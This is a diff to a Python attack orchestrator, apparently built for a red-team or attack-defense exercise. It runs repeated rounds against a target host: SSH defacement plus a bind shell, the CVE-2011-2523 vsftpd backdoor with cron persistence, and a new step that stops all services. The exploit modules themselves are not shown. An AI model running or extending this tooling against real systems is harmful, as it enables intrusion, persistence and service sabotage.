@@ -9,22 +9,22 @@ admin panel.  Once received, begins the attack loop:
 
     Round 1 immediately, then every ATTACK_INTERVAL seconds (15 min).
 
-Each round runs:
-    1. ssh_deface    — SSH in with default creds, overwrite nginx index.html
-    2. vsftpd_backdoor — CVE-2011-2523 root shell, install persistence
+Each round runs three attacks in sequence:
+    1. ssh_deface       — SSH + sudo root → deface nginx + plant bind shell
+    2. vsftpd_backdoor  — CVE-2011-2523 root shell → sysmon user + cron persistence
+    3. backdoor_exploit — use sysmon SSH or bind shell to stop all services
 
 Requires:
     pip3 install paramiko
 """
 
-import sys
 import time
 import threading
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from datetime import datetime
 
 from config import LISTENER_PORT, ATTACK_INTERVAL, TARGET_HOST
-from attacks import ssh_deface, vsftpd_backdoor
+from attacks import ssh_deface, vsftpd_backdoor, backdoor_exploit
 
 # ── State ─────────────────────────────────────────────────────────────
 _started = False
@@ -33,24 +33,30 @@ _lock    = threading.Lock()
 
 # ── Logging ───────────────────────────────────────────────────────────
 def log(msg):
-    ts = datetime.now().strftime("%H:%M:%S")
-    print(f"[{ts}] {msg}", flush=True)
+    print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}", flush=True)
 
 
 # ── Attack loop ───────────────────────────────────────────────────────
 def attack_round(round_num):
     log(f"━━━ Round {round_num} — target {TARGET_HOST} ━━━")
 
-    log("[1/2] SSH deface")
+    log("[1/3] SSH deface + bind shell")
     try:
         ok = ssh_deface.run(log)
         log(f"      {'OK' if ok else 'FAILED'}")
     except Exception as e:
         log(f"      ERROR: {e}")
 
-    log("[2/2] vsftpd backdoor")
+    log("[2/3] vsftpd backdoor (CVE-2011-2523)")
     try:
         ok = vsftpd_backdoor.run(log)
+        log(f"      {'OK' if ok else 'FAILED'}")
+    except Exception as e:
+        log(f"      ERROR: {e}")
+
+    log("[3/3] Backdoor exploit — stop services")
+    try:
+        ok = backdoor_exploit.run(log)
         log(f"      {'OK' if ok else 'FAILED'}")
     except Exception as e:
         log(f"      ERROR: {e}")
@@ -82,11 +88,10 @@ class Handler(BaseHTTPRequestHandler):
     def do_POST(self):
         if self.path == "/start":
             launched = start_attacks()
+            body = b"started" if launched else b"already running"
             if launched:
-                body = b"started"
                 log(f"Start signal received from {self.client_address[0]}")
             else:
-                body = b"already running"
                 log("Duplicate start signal ignored")
             self.send_response(200)
             self.send_header("Content-Type", "text/plain")
